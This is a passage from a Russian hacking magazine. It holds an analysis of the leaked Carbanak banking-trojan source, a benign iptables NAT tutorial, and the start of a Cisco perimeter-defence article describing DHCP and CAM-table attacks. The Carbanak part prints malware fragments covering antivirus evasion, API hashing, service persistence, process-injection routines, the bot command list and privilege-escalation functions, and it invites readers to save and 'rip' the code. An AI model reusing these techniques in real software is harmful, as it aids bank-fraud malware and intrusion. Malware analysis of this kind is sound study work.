бочайшей тайне. Именно поэто му мы никак не могли упус‐
тить уникальное событие — попада ние исходников банков‐
ского троя Carbanak в паблик — и принялись исследовать
его устройство изнутри. Результатами этих изысканий мы
сегодня щедро поделимся с тобой.


Хакер уже писал об утечке в публичный дос туп исходных кодов банковской
мал вари Carbanak. Надо ска зать, что эта малварь сей час все еще активна
и развивается, несмотря на арес ты, а украденные суммы давно перевалили
за  миллиард  дол ларов.  Все  любопытствующие  могут  ознакомиться
с исходным кодом этого творения на GitHub. Лично я рекомендую сохранить
этот код (для академических исследований, естественно), а то всякое может
случиться. Итак, давай заглянем внутрь Carbanak.





                      Структура проекта Carbanak

Первое, что меня обычно привлекает в профес сионально написанной мал‐
вари, — это способы, с помощью которых эта самая малварь противодей‐
ствует антивирусам и скрывает свою активность. В Carbanak используется
несколько приемов борьбы с антивирус ными прог раммами. Их мы сейчас
и рассмотрим.
  Для начала мне стало интерес но, как Carbanak общается с WinAPI и каким
образом вызывает нужные ему функции. Чтобы увидеть этот механизм, необ‐
ходимо заглянуть в сле дующие файлы:


core\source\winapi.cpp
core\include\core\winapi.h
core\include\core\api_funcs_type.h
core\include\core\api_funcs_hash.h

Бросается в глаза код получения структуры про цес сов PEB, настроенный
на условную ком пиляцию в зависимос ти от архи тектуры сис темы:


PPEB GetPEB()
{
#ifdef _WIN64
    return  (PPEB)__readgsqword(0x60);
#else
    PPEB PEB;
    __asm
    {
        mov eax, FS:[0x30]
        mov [PEB], eax
    }
    return PEB;
#endif
}

Там же представлен список нужных DLL, где хранятся WinAPI (это только часть
используемых тро яном библиотек):


const char* namesDll[] =
{
    _CT_("kernel32.dll"), // KERNEL32 = 0
    _CT_("user32.dll"), // USER32 = 1
    _CT_("ntdll.dll"), // NTDLL = 2
    _CT_("shlwapi.dll"), // SHLWAPI = 3
    _CT_("iphlpapi.dll"), // IPHLPAPI = 4
    _CT_("urlmon.dll"), // URLMON = 5


.....

Обрати внимание на макросы _CT_ — они шифруют строки. Ты ведь не думал,
что в малвари подоб ного уровня текстовые стро ки будут храниться в откры‐
том виде? Кроме того, в бло ке инициализации этого модуля мы видим код,
динамически получающий функции GetProcAddress и LoadLibraryA по их
хешу:


HMODULE kernel32;
    if ( (kernel32 = GetDllBase(hashKernel32)) == NULL )
        return false;
    _GetProcAddress = (typeGetProcAddress)GetApiAddr( kernel32,
hashGetProcAddress );
    _LoadLibraryA = (typeLoadLibraryA)GetApiAddr( kernel32, hashLo
adLibraryA );
    if ( (_GetProcAddress == NULL) || (_LoadLibraryA == NULL) )

Далее троян выпол няет поиск и сравнение с таб лицей хешей искомых фун‐
кций. Вот, например, часть кода, с помощью которой Carbanak определя ет,
найдена нужная функция или нет:


for( uint i = 0; i < exportDir‐>NumberOfNames; i++)
    {
        char* name = (char*)RVATOVA( module, *namesTable );
        if( Str::Hash(name) == hashFunc )
        {
            ordinal = *ordinalTable;
            break;
    }
        // Следующая функция
        namesTable++;
        ordinalTable++;
    }

На самом деле перед нами клас сический дви жок для поиска WinAPI по их
хешу, о котором мы уже говорили в отдельной статье.
  Кроме всего прочего, меня привлек кусок кода, в комментариях к которо‐
му было написано «антиэмуляционная защита от КАВа». Такой код встречает‐
ся в нескольких местах это го про екта:


// Антиэмуляционная защита от КАВа


char path2[MAX_PATH];       // Символьный массив
API(KERNEL32, GetTempPathA)( MAX_PATH, path2 );     // Получаем в
него путь до папки временных файлов
API(KERNEL32, CreateFileA)( path2, GENERIC_READ | GENERIC_WRITE, 0, 0
, OPEN_EXISTING, 0, 0 );   // OPEN_EXISTING — открыть файл
if( API(KERNEL32, GetLastError)() == 3 )        // ERROR_PATH_NOT_
FOUND

Суть этого приема заключается в том, что эмуляторы антивирусных решений
не всегда могут кор ректно вос произвести поведение окру жения, в котором
выпол няется приложение. В данном случае троян сначала вызывает функцию
GetTempPathA, позволяющую получить путь до папки вре менных файлов
(temp), а затем пытается запус тить несуществу ющий файл из нее. Если пос ле
этих действий ОС вернет ошиб ку ERROR_PATH_NOT_FOUND (обычная ошибка
при выполнении приложения  в реальной системе), малварь приходит
к выводу, что исполнение кода не эмулируется средствами антивиру са,
и управление передается дальше.


             INFO

                     Для любите лей «рипать» код: тут все не так прос‐
                            то.
                     Дело в том, что код наполнен вызовами WinAPI,
                        связанными с движком Carbanak. Кроме того,
                        в этом банкере есть своя система управления
                       памятью, модуль работы с PE‐файлами и многое
                       другое. Все это содержится в собственных name‐
                          space’ах, и, если ты, к примеру, захочешь поза‐
                     имствовать код инжекта в процессы, тебе необ‐
                      ходимо будет тянуть из исходников WinAPI‐дви‐
                         жок, управление памятью, строками, векторами
                      и еще массу вся ких прочих ништяков.
                    Я не говорю, что рип нуть код отсюда нереаль‐
                          но, просто придется немного посидеть и поис‐
                       следовать  его,  что бы  более‐менее  органично
                     выцеплять  интересующие  тебя  куски  с  сох‐
                      ранением их работоспособности.


Кроме того, в файле с говоря щим названием bot\source\AV.cpp был обна‐
ружен еще один способ детектирования различных антивирусных решений.
Троян выполняет поиск процес сов стандартным способом  (CreateTool‐
help32Snapshot\Process32First\Process32Next), пос ле чего найденные
процессы сверяются с хешами внутри вот такого case’а с помощью функции
int AVDetect():


switch( hash )
{
case 0x0fc4e7c5: // sfctlcom.exe
case 0x0946e915: // protoolbarupdate.exe
case 0x06810b75: // tmproxy.exe
case 0x06da37a5: // tmpfw.exe
case 0x0ae475a5: // tmbmsrv.exe
case 0x0becd795: // ufseagnt.exe
case 0x0b97d795: // uiseagnt.exe
case 0x08cdf1a5: // ufnavi.exe
case 0x0b82e2c5: // uiwatchdog.exe
return AV_TrandMicro;
case 0x0d802425: // avgam.exe
case 0x0f579645: // avgcsrvx.exe
case 0x0e048135: // avgfws9.exe
case 0x0c34c035: // avgemc.exe
case 0x09adc005: // avgrsx.exe
case 0x0c579515: // avgchsvx.exe
case 0x08e48255: // avgtray.exe
case 0x0ebc2425: // avgui.exe
return AV_AVG;
case 0x08d34c85: // avp.exe
case 0x07bc2435: // avpui.exe
return AV_KAV;

В боте пре дусмотрен конфигуратор, первоначаль ную настройку которого
проводит специальное приложение — билдер. Оно заполняет все необ‐
ходимые поля для начальной инициализации троя, учитывающие определен‐
ные пожелания пользователя. Например, в билдере можно настроить адреса
админок, серверов, различные переменные, свя занные с работой бота, вза‐
имодействие с плагинами и прочее. Интерфейс билдера показан на сле‐
дующем рисунке.





                        Билдер Carbanak

Настройки билдера определяются в файле bot\source\config.cpp и выг‐
лядят примерно так (это только часть нас троек):


// Данные, заполняемые билдером
char PeriodConnect[MaxSizePeriodConnect] = PERIOD_CONTACT;
char Prefix[MaxSizePrefix] = PREFIX_NAME;
char Hosts[MaxSizeHostAdmin] = ADMIN_PANEL_HOSTS;
char HostsAZ[MaxSizeHostAdmin] = ADMIN_AZ;
char UserAZ[MaxSizeUserAZ] = USER_AZ;
char VideoServers[MaxSizeIpVideoServer] = VIDEO_SERVER_IP;
char FlagsVideoServer[MaxFlagsVideoServer] = FLAGS_VIDEO_SERVER;
char Password[MaxSizePasswordAdmin] = ADMIN_PASSWORD;
byte RandVector[MaxSizeRandVector] = MASK_RAND_VECTOR;
char MiscState[MaxSizeMiscState] = MISC_STATE;
char PublicKey[MaxSizePublicKey] = PUBLIC_KEY;
char DateWork[MaxSizeDateWork] = DATE_WORK;
char TableDecodeString[256]; // Таблица для перекодировки символов в
зашифрованной строке
...

Далее, в функции bool Init(), поведение бота конфигурируется в соответс‐
твии с переданными билдером нас трой ками. В коде это выглядит таким обра‐
зом:


if( miscState[0] == '0' ) // Отключена инсталляция в автозагрузку
    {
        state |= NOT_INSTALL_SERVICE | NOT_INSTALL_AUTORUN;
        DbgMsg( "Отключена инсталляция в автозагрузку" );
    }
    if( miscState[1] == '0' ) // Отключен запуск сплоита
    {
        state |= SPLOYTY_OFF;
        DbgMsg( "Отключен запуск сплоита" );
    }
    if( miscState[2] == '1' )
    {
        state |= CHECK_DUPLICATION;
        DbgMsg( "Включена проверка запуска копии" );
    }
...

А вот так настраивается поведение в зависимости от того, какие антивирусы
были обнаружены в атакуемой системе:


AV = AVDetect();
    DbgMsg( "AVDetect %d", AV );
    exeDonor[0] = 0;
    if( AV == AV_AVG )
    {
        Str::Copy( exeDonor, sizeof(exeDonor), _CS_("Window
sPowerShell\\v1.0\\powershell.exe") );
    }
    else if( AV == AV_TrandMicro )
    {
        StringBuilder path( exeDonor, sizeof(exeDonor) );
        bool res = Path::GetCSIDLPath(CSIDL_PROGRAM_FILESX86, path );
        if( !res )
            res = Path::GetCSIDLPath(CSIDL_PROGRAM_FILESX86, path );
//      DbgMsg( "%s", exeDonor );
        if( res )
            Path::AppendFile( path, _CS_("Internet Explorer\\
iexplore.exe") );
        else
            Str::Copy( exeDonor, sizeof(exeDonor), _CS_("mstsc.exe")
);
    }
    return true;

Теперь переместимся в модуль начальной загрузки и установки и пос мотрим,
как там все устроено. Этот модуль занимается запус ком и обновлением бота,
а также обеспечением персистентности в системе. За установку в качес тве
сервиса отве чает namespace Service::, кон кретнее — функция Service::
Install. Установка происхо дит банальным вызовом системной функции
OpenSCManagerA‐>CreateServiceA, реализован этот вызов в файле down‐
loader\source\service.cpp:


bool Install( const StringBuilder& srcFile, bool copyFile )
{
    DbgMsg( "Инсталляция бота как сервиса, исходный файл '%s'",
srcFile.c_str() );
    StringBuilderStack<MAX_PATH> fileName;
    if( !GetFileNameService(fileName) )
        return false;
    DbgMsg( "Имя файла сервиса '%s'", fileName.c_str() );


    if( copyFile )
        Copy( srcFile );
    else
        DbgMsg( "Файл сервиса уже был скопирован" );


    StringBuilderStack<256> nameService, displayName;
    if( !CreateNameService( nameService, displayName ) )
        return false;
    DbgMsg( "Имя сервиса '%s', '%s'", nameService.c_str(), displa
yName.c_str() );
//
// В функции Create идут вызовы OpenSCManagerA‐>CreateServiceA:
//
    bool ret = Create( fileName, nameService, displayName );
    if( ret )
    {
        Str::Copy( Config::fileNameBot, sizeof(Config::fileNameBot),
fileName, fileName.Len() );
            Str::Copy( Config::nameService, sizeof(Config::nameSe
rvice), nameService.c_str(), nameService.Len() );
        }
    return ret;
}

Общая схема установки сервиса показана на следующей иллюстрации.





                     Схема уста новки сервиса

Также предполагается уста новка бота в папку авто загрузки с помощью фун‐
кции bool SetAutorun().
   Теперь перейдем к методу запуска бота лоадером. Запуск кода может
выпол няться несколь кими методами в зависимости от первоначальных нас‐
троек билдера. Привес ти весь код в статье целиком не получится — его
слишком много, поэтому я опишу примерную схему и названия используемых
вредоносом функций. Итак, схема запус ка трояна показана на следующей
картинке.





                     Схема запуска файла бота

А вот основные вызовы запуска кода  (к комментариям разработчика я
добавил свои):


// Запуск образа через установку потока в очередь асинхронных вызовов
// Передача управления происходит через APC, реализован цепочкой
вызовов ZwQueueApcThread — ZwResumeThread
bool RunInjectCode( HANDLE hprocess, HANDLE hthread, typeFuncThread
startFunc, typeInjectCode func );


// Запуск образа через изменения адреса старта потока
// Пишем в память процесса при помощи WriteProcessMemory, меняем
контекст при помощи ZwSetContextThread и запускаем тред при помощи
ZwResumeThread
bool RunInjectCode2( HANDLE hprocess, HANDLE hthread, typeFuncThread
startFunc, typeInjectCode func );


// Запуск образа через запуск потока указанного процесса
// Создаем удаленный тред при помощи CreateRemoteThread в
приостановленном состоянии (флаг CREATE_SUSPENDED) с передачей в
него нужной callback‐функции
bool RunInjectCode3( HANDLE hprocess, HANDLE hthread, typeFuncThread
startFunc, typeInjectCode func );

Интересно, что в малвари подобного рода используются широко извес тные
способы запуска кода, но надо отдать должное раз работчику: вместе с этим
применяется индивидуальная подстройка бота в конфиге для максимально
эффективной работы в усло виях функционирующего антивирус ного ПО.
   Естественно, вся эта красота управляется внеш ними командами, переда‐
ваемыми от сервера, вза имодействие с которым реализовано в файле
botcmd\source\main.cpp:


CommandFunc commands[] =
{
// Команды, отсылаемые боту
    { "video", CmdSendBot },
    { "download", CmdSendBot },
    { "runmem", CmdSendBot },
    { "ammyy", CmdSendBot },
    { "update", CmdSendBot },
    { "updklgcfg", CmdSendBot },
    /*{ "ifobs", CmdSendBot },*/
    { "httpproxy", CmdSendBot },
    { "killos", CmdSendBot },
    { "reboot", CmdSendBot },
    { "tunnel", CmdSendBot },
    { "adminka", CmdSendBot },
    { "server", CmdSendBot },
    { "user", CmdSendBot },
    { "rdp", CmdSendBot },
    { "screenshot", CmdSendBot },
    { "sleep", CmdSendBot },
    { "logonpasswords", CmdSendBot },
    { "vnc", CmdSendBot },
    { "runmem", CmdSendBot },
    { "dupl", CmdSendBot },
    { "findfiles", CmdSendBot },
    { "runfile", CmdSendBot },
    { "killbot", CmdSendBot },
    { "del", CmdSendBot },
    { "secure", CmdSendBot },
    { "plugins", CmdSendBot },
    { "tinymet", CmdSendBot },
    { "killprocess", CmdSendBot },
// Команды, выполняемые утилитой
    { "info", CmdInfo },
    { "getproxy", CmdGetProxy },
    { "exit", CmdExit },
    { "uac", CmdUAC },
    { "elevation", CmdElevation },
    { 0, 0 }
};

Названия команд говорят сами за себя, по ним лег ко определить возможнос‐
ти трояна. Функция, в которой они обра батываются, называется bool Dis‐
patchArgs(StringArray& args) и находится в этом же файле.
  В архитектуре Carbanak есть модуль для повыше ния привилегий, име‐
ющий единственный недос таток: из‐за того что в паб лик попали исходные
коды не самой последней версии, используемые этим модулем дыры уже
пофикшены. Но в любом случае тебе будет интерес но ознакомиться с этими
функциями, представленными в файле core\include\core\elevation.h:


// Запускает файл nameExe и дает ему системные права
bool Sdrop( const char* nameExe );
bool NDProxy( DWORD pid = 0 );
bool PathRec();


// Обход UAC для Win7
// После обхода shellcode выполняет выход из процесса, поэтому если
запускается DLL, то из нее нужно выйти только после выполнения всех
операций
bool UACBypass( const char* engineDll, const char *commandLine, int
method = 0 );
bool COM( const char* dllPath, const char* cmd );
// wait = true, если нужно дождаться выполнения cmd
bool BlackEnergy2( const char* cmd, bool wait = false );


// Поднимает права до системных
bool EUDC();
bool CVE2014_4113();

В Carbanak есть еще много раз ных фишек: например, здесь имеется своя
реализация  управления  памятью  (обертка  над  WinAPI),  есть  плагины
для работы с VNC и Outlook. Как и некоторые дру гие банкеры, троян таскает
с собой утилиту для перехвата паролей открытых сессий в Windows —
Mimikatz. В Carbanak предусмотрена возможность проксирования трафика,
реализовано взаимо действие с POS‐терминала ми и еще масса всего —
на описание всех возможностей уйдет не одна неделя досконального изу‐
чения кода и потребуется не одна статья. Я надеюсь, что эта заметка пос‐
лужит отправной точкой в самос тоятельном изучении Carbanak и поз волит
тебе пополнить багаж зна ний в области вирусологии.
АДМИН
   МАГИЯ
  IPTABLES

         НЕОБЫЧНЫЕ ВИДЫ
         ПРЕОБРАЗОВАНИЙ
          СЕТЕВЫХ АДРЕСОВ





Настраивать проброс портов и общий дос‐
туп  к интернету через один  публичный
адрес умеют все, но не все зна ют, что воз‐
можности NAT в  netﬁlter гораздо шире.       КоординаторДаниил Батуринпроекта VyOS
Сегодня я продемонстрирую тебе эти воз‐        (https://vyos.io),функциональщик,«языковед»,иногда
можности с помощью синтаксиса коман ды        сетевойdaniil@baturin.orgадминистратор.
iptables.


Самые новые вер сии некоторых дистрибутивов уже используют nftables,
но до ухода iptables в прошлое еще далеко. Поскольку популярные ОС мар‐
шрутизаторов, даже проприетарные, сейчас осно ваны на  Linux, многое
из этой статьи можно применить и к ним, при условии что их интерфейс
не ограничивает фор мат опций искусс твенно, а прос то передает их в правила
iptables.


1:1 NAT
Все, кто использовал Amazon EC2, online.net и дру гие облачные платформы,
наверняка с ним уже сталкивались. Публичные адреса для виртуалок настро‐
ить в админке можно, но самой виртуалке при этом выдается час тный адрес.
   Чтобы это сделать, нуж но всего лишь указать по одному адре су вместо
целой сети в ‐‐source/‐‐destination и ‐‐to‐destination/‐‐to‐source
соответственно.
   Вот команды для сопоставления час тно го адреса 10.0.0.10 публично‐
му 102.0.2.10:


$ sudo iptables ‐t nat ‐I PREROUTING ‐d 192.0.2.10 ‐j DNAT
‐‐to‐destination 10.0.0.10
$ sudo iptables ‐t nat ‐I POSTROUTING ‐s 10.0.0.10 ‐j SNAT
‐‐to‐source 192.0.2.10


             INFO

                      Если нет необходимости подключаться к внут‐
                      реннему адресу из интернета, достаточно одно го
                      правила SNAT — об отве тах позаботится модуль
                          conntrack, если он не выключен.



NETMAP
Что делать, если нужно транслировать не один адрес, а целую сеть? Нередко
одной компании бывает нуж но подключиться к сети другой — например,
к поставщику тех нической поддержки или иных услуг. Проблемы начинаются,
если у поставщика уже есть клиент с такой же сетью, как у тебя.
   Здесь на помощь приходит опция NETMAP, которая транслирует одну сеть
в другую.


             INFO

                    Полезно знать, что сети для частного исполь‐
                       зования из RFC 1918 на самом деле очень боль‐
                     шого размера. Вот они:
                  •10.0.0.0/8 (до 10.255.255.255.255);
                  •172.16.0.0/12 (до 172.31.255.255);
                  •192.168.0.0/16 (до 192.168.255.255).

                      Если  выбрать  менее  популярные  адреса,
                     чем 192.168.(0|1).0 или 10.0.0.0, с конфликтом
                   можно не столкнуться никогда.


Предположим, в компании‐клиенте используется сеть 192.168.0.0/24, а в
компании‐поставщике — 10.85.0.0/24. Мы сделаем вид, что в нашей ком‐
пании сеть не 192.168.0.0/24, а 172.17.18.0/24:


$ sudo iptables ‐t nat ‐I POSTROUTING ‐s 192.168.0.0/24 ‐d 10.85.0.0/
24 ‐j NETMAP ‐‐to 172.17.18.0/24
$ sudo iptables ‐t nat ‐I PREROUTING ‐s 10.85.0.0/24 ‐d 172.17.18.0/
24 ‐j NETNAP ‐‐to 192.168.0.0/24

В отличие от SNAT и DNAT, она заменяет не весь адрес источника или наз‐
начения, а  только адрес  хос та —  ту  часть,  где  в маске сети  нули.
Адрес 192.168.0.10 всегда транслирует ся в 172.17.18.10, так что этот метод
отлично подходит для двусторонней работы.
   Если соединения инициируются только с внутренней или внешней сто‐
роны, здесь тоже можно обойтись без вто рого пра вила, дос таточно настро‐
ить только PREROUTING для соединений сна ружи или POSTROUTING для соеди‐
нений изнутри, а остальное conntrack сделает за нас.
  Очевидный недостаток — для правильной работы сети дол жны быть оди‐
накового размера. Никакой проверки или даже требования предоставить
опцию ‐s/‐d в iptables нет. Если сеть источника меньше сети назначения,
то вместе с адресом хоста NETMAP изменит и часть адре са сети. Если сеть
источника больше — изуроду ет адрес хоста. Сетевой стек Linux вообще
без предрассудков — делает ровно то, о чем его просят, даже если в этом
нет никакого смысла.
   Этот вид NAT также работа ет с IPv6:


$ ip6tables ‐t nat ‐I POSTROUTING ‐s 2001:db8:aaaa::/64 ‐j NETMAP
‐‐to 2001:db8:bbbb::/64


NPT (NETWORK PREFIX TRANSLATION)
Более правильным решением для трансляции сетей IPv6 будет функция
NPTv6, описанная в RFC 6296. Она не отслеживает соеди нения, так что ее
производительность лучше, но потребуются два правила на вход и на выход:


$ sudo ip6tables ‐t mangle ‐I POSTROUTING ‐o eth0 ‐j SNPT ‐‐src‐pfx
2001:db8:aaaa::/64 ‐‐dst‐pfx 2001:db8:bbbb::/64
$ sudo ip6tables ‐t mangle ‐I PREROUTING ‐i eth0 ‐j SNPT ‐‐src‐pfx
2001:db8:bbbb::/64 ‐‐dst‐pfx 2001:db8:aaaa::/64


NAT БЕЗ CONNTRACK
Подсистема отслеживания соединений (conntrack) решает много проблем
и экономит время при настройке. Пра вила с опцией ‐‐state ESTABLISHED,
RELATED есть почти у каждого пользователя iptables, без них пришлось бы
писать два полных набора пра вил на вход и на выход. Кроме того, conntrack
helpers (модули nf_nat_ftp и прочие) сильно упрощают работу с протоко‐
лами, которые тре буют более одного соеди нения.
  Обратная сторона удобства — меньшая про изводительность. В случае
с NPTv6, да и с NETMAP и 1:1 NAT, если все равно указаны оба правила
и опции никак не ограничивают протокол и порт, отслеживание сос тояний
не приносит особой пользы и его мож но было бы отключить.
  Отключить отслеживание можно следующим обра зом:


$ sudo iptables ‐t raw ‐I PREROUTING ‐d 192.168.0.0/24 ‐j NOTRACK
$ sudo iptables ‐t raw ‐I OUTPUT ‐s 10.85.0.0/24 ‐j NOTRACK

Для IPv6 все так же, только с командой ip6tables.
  С NOTRACK нужно быть очень осто рожным. Если у тебя есть правила
с опцией ‐‐state, они, очевидно, перестанут работать, что может грозить
потерей удаленного дос тупа к устройству. Убедись, что в правило попадет
только трафик, который действительно не требует отслеживания состояний!


БАЛАНСИРОВКА ТРАФИКА С ПОМОЩЬЮ NAT
Классический  masquerade  транслирует множес тво  внутренних  адресов
в один внешний. Если вывернуть это правило наизнанку, оно будет трансли‐
ровать один внешний адрес во множество внутренних.
   Это можно использовать для простой балансировки трафика. В отличие
от nginx или varnish, балансировка на сетевом уровне ничего не знает
о протоколе уровня приложений, но зато не зависит от конкретного протоко‐
ла и работает с приложениями, для которых специализированных решений
не существует.
  Предположим, в нашей сети есть пять серверов с адресами 10.0.0.10–
10.0.0.15  и  мы  хотим  балансировать  зап росы  к  внешнему  адре‐
су 192.0.2.10 между ними. Это мож но сделать следующей командой:


$ sudo iptables ‐I PREROUTING ‐d 192.0.2.10/32 ‐j DNAT ‐‐to‐destin
ation 10.0.0.10‐10.0.0.15

При включенном conntrack такая балансировка работает на уровне соеди‐
нений, а не пакетов и вполне годится для протоко лов, которые требуют пос‐
тоянного соединения, вроде SSH или RDP. Единственный недос таток в том,
что внутренние адреса серверов должны быть в непрерывном диапазоне.
Никакого способа указать список адресов или сеть не предусмотрено.
  С помощью допол нитель ных опций ‐‐random и ‐‐persistent можно пов‐
лиять на то, будет соединение с одного внешнего адреса с большей веро‐
ятностью отправ лено на один и тот же внутренний адрес или нет.
   Если поменять PREROUTING на POSTROUTING и ‐d на ‐s, можно трансли‐
ровать один внутренний адрес во множество внешних. Я не знаю, кому
и зачем это может потребовать ся, но техническая воз можность у тебя есть.


HAIRPIN
Ты, возможно, уже сталкивался с ситуацией, когда с внешнего адреса мар‐
шрутизатора проб рошен порт на сервер внутри сети, но при этом попасть
на сервер по внешнему адресу изнутри сети не получается.
  Правильное решение в этом случае — split horizon DNS. Многие серверы
DNS, вклю чая самый популярный BIND, умеют выдавать разный результат
в зависимости от адреса клиента. Но в большинс тве сетей нет своего сер‐
вера, и не всегда он нужен.
  В этом случае приходит на помощь hairpin или NAT reﬂection. Пред‐
положим, у тебя есть такое правило для проброса порта на веб‐сервер:


$ sudo iptables ‐t nat ‐I PREROUTING ‐p tcp ‐‐dport 80 ‐d 203.0.113.
10 ‐j DNAT ‐‐to‐destination 10.0.0.20

Если из сети зайти на http://203.0.113.10, соеди нение отвалится с тайм‐аутом.
Если запустить tcpdump или tshark, можно уви деть, что на сервер пакеты при‐
ходят правильно. Проблема здесь в том, что, если ты отправляешь запрос
с 10.0.0.123, сервер посылает ответ не маршрутизатору, а напрямую обратно
к 10.0.0.123, посколь ку они в одной сети.
  Остается одно: пропус кать весь тра фик из сети в нее саму через маршру‐
тизатор:


$ sudo iptables ‐t nat ‐I POSTROUTING ‐s 10.0.0.0/24 ‐d 10.0.0.0/24
‐j MASQUERADE


NAT В EBTABLES
Обычно NAT ассоциирует ся с сетевым уровнем, но это не значит, что его нет
на канальном. В кадрах Ethernet есть MAC‐адреса источника и назначения,
и ebtables позволяет их поменять.
  К примеру, тебе нужно перенаправить зеркалиро ванный трафик с порта
коммутатора в локальный процесс для ана лиза. Поменять IP‐адрес наз‐
начения, чтобы пакеты попали в локаль ный процесс, можно с помощью ipta‐
bles, но сначала нужно сделать так, чтобы MAC‐адрес назначения совпадал
с адресом сетевой карты, ина че ядро отбросит этот трафик, даже не пос‐
мотрев на IP.
   Тут нам на помощь и придет ebtables:


$ sudo ebtables ‐t broute ‐I BROUTING ‐i eth0 ‐j dnat ‐‐to‐destin
ation 00:aa:bb:cc:dd:ee


ЗАКЛЮЧЕНИЕ
Не забывай, что в недрах man iptables‐extensions всегда можно отыскать
что‐то интересное. Не ограничивайся чужими статьями, читай первоис точни‐
ки сам и, если придумаешь что‐то интерес ное, не стесняй ся предложить нам
статью.
АДМИН
     СТАЛЬНАЯ
         КИСА





                                                                          Иван Пискунов





                        ЗАЩИЩАЕМ
                     СЕТЕВОЙ ПЕРИМЕТР
                      НА ОБОРУДОВАНИИ
                                  CISCO





Защита своей тер ритории — один из сильнейших при родных
инстинктов. Крупные хищники используют для этого когти
и клыки, скунсы — пахучие железы в основании хвоста,
а сисадмины — правильную настройку софта и железа
для предотвращения сетевых атак. Сегодня мы рассмотрим
наиболее популярные виды таких вторжений и разберем
методы защиты от них на при мере опе рационной системы
Cisco IOS. В этой статье мы затронем наиболее популярные
сетевые атаки, относящиеся к DHCP, VLAN, STP и Switch
table.


О, МОЯ ОБОРОНА!
В теории обеспечения информационной безопас ности есть такое понятие,
как глубоко эше лонированная обо рона (Defense in depth). Этим мудреным
термином называют концепцию, в которой весь корпоративный ИТ‐ландшафт
делится на несколь ко уровней контроля безопасности и защиты. Причем
один уровень, или, как его еще называют, рубеж защиты, не зависит
от остальных и является самос тоятельной единицей.
  К примеру, на границе внутренней локальной сети и интернета стоят
периметровые средства защиты, такие как Firewall, IDS/IPS, NGFW (Next‐Gen‐
eration_Firewall) или UTM‐шлюзы. Далее вся сеть мониторится на предмет
выявления аномальной активнос ти и инци дентов ИБ, к примеру с помощью
SIEM‐системы. Состояние ПО контролиру ется с помощью сканеров безопас‐
ности.
  На следующем уровне задействованы средс тва защиты прикладного ПО,
к примеру WAF для веб‐сервера или DAM для СУБД. Ну а на конечных узлах
применяются уже endpoint средс тва защиты — AV, SSO, DLP и другие страш‐
ные аббревиатуры, которыми обоз нача ют штатные механиз мы безопас ности
ОС, системы разделения прав доступа и полномочий пользователей, шиф‐
рование на лету и прочее.





            Концепция глубоко эшелонированной обороны

В сегодняшней статье мы разберем только одну часть этой схемы, а именно
защиту сетевого периметра корпоративного ИТ‐ландшафта на при мере ком‐
мутаторов и маршрутизаторов компании Cisco.


             INFO

                       Чтобы провернуть все описанные в этой статье
                         атаки на практике, не нужно много. Вполне хва‐
                            тит, к примеру, такой ути литы, как Yersinia. Она
                      доступна для установки на любую Linux‐систему
                      и входит в сборку дистрибутива Kali Linux.



ТИПОВЫЕ СЕТЕВЫЕ АТАКИ
Перед тем как мы приступим к практической час ти, посвященной безопас ной
настройке сетевого оборудо вания, рас смот рим типовые атаки, которые
с высокой вероятностью будут использовать ся против твоей сети злоумыш‐
ленниками. Ну или экспертами ИБ при проведении пентестов.


Rogue DHCP Server
Цель этой атаки — подмена легитимного сервера DHCP сервером злоумыш‐
ленника. Суть угрозы заключа ется в том, что, когда в сети одновре менно
находятся два сервера DHCP, один из которых «вражеский» (Rogue DHCP
Server), часть клиентов автоматически сконфигурирует у себя неправильные
адреса и прочие сетевые нас тройки. Далее в результате подмены умол‐
чательного шлюза неавторизованный сервер DHCP сможет прослушивать
весь трафик клиентов, при этом еще имея воз можность форвардить все
пакеты по своему усмотрению.
  Однако чаще всего ата ка с подменой сервера DHCP не явля ется атакой
как таковой, а скорее служит неким плацдармом для дальнейше го углубле ния
злодеев в атакуемую сеть.





              Иллюс тра ция ата ки Rogue DHCP Server


DHCP starvation
Еще одна простая и популярная ата ка, выполняемая при помощи протокола
DHCP. Суть ее заключается в том, что пул DHCP, из которого все корпоратив‐
ные клиенты получают IP‐адреса, изначально ограничен дос тупным диапа‐
зоном. Например, это может быть 253 адреса при использовании мас‐
ки 255.255.255.0. Для нормальной работы сети этого должно хватить всем
клиентам за глаза, однако «ата ка резервации» (DHCP starvation) стре мится
исчерпать этот пул и таким обра зом вывес ти легитимный сервер DHCP
из игры.
   Если воспроизвести действия зло деев по шагам, то вот как происходит
такая атака:
 1. Атакующее устрой ство зап рашивает себе IP‐адрес, маску и шлюз по умол‐
   чанию у сервера DHCP и получает их.
 2. MAC‐адрес атакующего устройства изменяется, и оно запрашивает сле‐
   дующий, уже другой IP‐адрес, мас киру ясь под некоего нового клиента,
   который появился в кор поративной сети.
 3. Предыдущие два пункта цикличес ки повторяются до тех пор, пока весь пул
   IP‐адресов на сервере не будет исчерпан.

Возможны два следствия, в зависимос ти от того, чего добиваются ата‐
кующие:
 • Отказ в обслу живании. Имеющиеся у сервера IP‐адреса исчерпаны,
   и новые хосты не могут получить их. Таким обра зом, их взаимодействие
   с сетью на этом закончится.
 • Под мена сервера DHCP. DHCP  starvation отлично комбинируется
   с предыдущей атакой Rogue DHCP Server. Так как на основном сервере
  DHCP свободных адресов уже не оста лось, он выключается, и все 100%
   корпоративных клиентов сети дос таются вражескому атакующе му DHCP‐
   серверу.





                Иллюс тра ция ата ки DHCP starvation


             INFO

                      У операционной системы IOS  есть несколько
                     режимов работы (конфигурирования):
                    •пользовательский режим (приглашение тер‐
                       минала в этом режиме имеет вид > ) позволяет
                          только просмотреть базовые настройки сетево‐
                           го устройства;
                    •привилегирован ный режим (# ) — для пол‐
                        ноценной настройки всех фун кций;
                    •режим кон фигури рования   ((config)# ),
                         в котором выполняются глобальные настройки.

                    Помимо этого, для настройки каждого отдельного
                      интерфейса есть режим специфической кон‐
                    фигурации (Router(config‐subif)#).



Атака на перепол нение таб лицы, или СAM table overflow
Атака CAM table overflow, или перепол нение локальной таблицы MAC‐
адресов, реализуется, когда таблица коммутации заполняется и пос ле этого
коммутатор работает в режиме  хаба. Иными словами, подключившись
к любому порту коммутатора пос ле успешной атаки, можно перехватывать
весь трафик в пределах широковещательного домена, которому принадлежит
этот порт. Атаку можно выполнить, например, с помощью утилиты macof,
которая входит в dsniﬀ.
   Чтобы понять, как работает эта ата ка, необходимо знать принципы работы
современного коммутатора. Давай представим себе коммутатор с именем
SW, к которому подклю чены два равнозначных хоста PC1 (MAC 0000.1111.1111)
и  PC2  (MAC  0000.2222.2222).  На  них  уже  настроены  IP‐адреса
(10.0.0.1 и 10.0.0.2), и эти хос ты хотят общаться друг с другом, как раз‐
